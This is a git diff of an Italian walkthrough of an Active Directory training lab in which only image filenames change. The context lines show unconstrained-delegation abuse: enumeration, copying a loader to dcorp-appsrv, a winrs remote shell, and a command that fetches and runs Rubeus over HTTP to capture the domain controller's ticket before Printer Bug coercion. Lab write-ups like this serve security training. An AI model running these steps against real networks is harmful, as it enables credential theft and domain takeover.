@@ -25,7 +25,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Abbiamo individuato <kbd>dcorp-appsrv</kbd> come host che permette Unconstrained Delegation
 
@@ -53,7 +53,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Abbiamo conferma dall'output che appadmin ha accesso admin remoto su dcorp-appsrv
 
@@ -67,7 +67,7 @@ Copiamo Loader su <kbd>dcorp-appsrv</kbd>
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Yd
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Accediamo dcorp-appsrv con winrs
 
@@ -75,7 +75,7 @@ Accediamo dcorp-appsrv con winrs
 winrs -r:dcorp-appsrv cmd
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Aggiungiamo l'interfaccia portproxy dal dcorp-appsrv alla studentVM per poter eseguire Rubeus tramite Loader, hostato via hfs sulla studentVM su 172.16.100.60:80
 
@@ -89,7 +89,7 @@ Eseguiamo Rubeus in modalita' Monitor
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilizzare Printer Bug per la Coercion\
 Sulla VM dello studente, utilizzare MS-RPRN per forzare l'autenticazione da dcorp-dc$.
